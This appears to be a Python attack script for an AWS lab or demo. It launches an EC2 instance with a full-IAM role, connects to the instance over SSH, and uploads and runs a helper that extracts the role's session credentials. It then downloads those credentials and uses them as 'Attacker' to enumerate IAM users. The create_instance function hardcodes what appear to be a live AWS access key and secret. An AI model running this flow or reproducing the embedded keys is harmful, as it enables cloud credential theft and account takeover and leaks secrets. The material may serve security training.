
import paramiko
import boto3
import json
import time

AWS_ACCESS_KEY_ID = ""
AWS_SECRET_ACCESS_KEY = ""
AWS_SECRET_TOKEN = ""

def get_session(sett, access, secret, token=None):
    try:
        if sett == "Vulnerable":
            sess = boto3.session.Session(
                region_name="us-east-1",
                aws_access_key_id=access,
                aws_secret_access_key=secret)
            
        elif sett == "Attacker":
            sess = boto3.session.Session(
                region_name="us-east-1",
                aws_access_key_id=access,
                aws_secret_access_key=secret,
                aws_session_token = token)
        else:
            sess = boto3.session.Session(region_name="us-east-1")

        return sess

    except Exception as e:
        print(f"Error: couldn't create a session. Details: {e}")



def extract_credentials():
    ssh = paramiko.SSHClient()
    print("-----Connecting to aws instance-----")
    k = paramiko.RSAKey.from_private_key_file("demo-ec2.pem")
    # OR k = paramiko.DSSKey.from_private_key_file(keyfilename)

    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(hostname="ec2-3-91-220-255.compute-1.amazonaws.com", username="ec2-user", pkey=k)
    sftp = ssh.open_sftp()
    print("-----Getting token-----")
    sftp.put("actions/extract_token.py","/home/ec2-user/extract_token.py") 


    command = "python3 extract_token.py"
    try:
        ssh_stdin, ssh_stdout, ssh_stderr = ssh.exec_command(command)

    except Exception as e:
        return f"Failed to extract credentials: Error {e}"
    print("SUCCESS!")
    stdout = []
    for line in ssh_stdout:
        stdout.append(line.strip())

    stderr = []
    for line in ssh_stderr:
        stderr.append(line.strip())

    #print("out:",stdout) 
    #print("err: ",stderr) 
    print("-----Storing credentials-----")
    sftp.get("/home/ec2-user/AccessKeys.json", "../AccessKeys.json") 
            
    # Clean up elements
    sftp.close()
    ssh.close()
    del ssh, ssh_stdin, ssh_stdout, ssh_stderr
    return stdout

def priv_scalation(keys):
    f = open(keys)
    new_keys = json.load(f)
    f.close()#cambiar a with open(file)
    access = new_keys["AccessKeyId"]
    secret = new_keys["SecretAccessKey"]
    token = new_keys["Token"]
    print("-----Reading new credentials-----")
    try:
        sess = get_session("Attacker", access,secret,token)
        print("SUCCESS!")
        client = sess.client('iam')
        lista = client.list_users(MaxItems=2)['Users']
        print('Users')
        for usuario in lista[1:]:
            print(f"- Arn: {usuario['Arn']}")
            print(f"  CreateDate: {str(usuario['CreateDate'])}")
            print(f"  PasswordLastUsed: {str(usuario['PasswordLastUsed'])}")
            print(f"  Path: {usuario['Path']}")
            print(f"  UserID: {usuario['UserId']}")
            print(f"  UserName: {usuario['UserName']}")



        return True
    except Exception as e:
        print(f"couldn't connect using new credentials: {e}")
        return False

    


def create_instance():
    #pendiente de revisar porque no me saca la ip :()
    access = "AKIASQTZUHT6HDAAMZF3"
    secret = "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"
    sess =  get_session('Vulnerable', access, secret)
    client = sess.resource('ec2')
    cli = sess.client('ec2')
    print("Creando instsncia....")
    instancia = client.create_instances(ImageId="ami-02f3f602d23f1659d",
                                        InstanceType="t2.micro",
                                        IamInstanceProfile={"Name": "iamfullaccess"},
                                        KeyName="demo-ec2",
                                        SecurityGroupIds=['sg-03d1a24ec4f2f11fe'],
                                        MaxCount=1,
                                        MinCount=1,
                                        )
    print("Instancia creada correctamente: ",instancia[0].id)

    #instancia[0].wait_until_running()
    print("wait until running")
    time.sleep(60)

    public_ip = instancia[0].public_ip_address
    public_dns = instancia[0].public_dns_name
    print(instancia[0].security_groups)
    print(public_ip)
    print(public_dns)

    return instancia

#extract_credentials()
#print(priv_scalation("AccessKeys.json"))
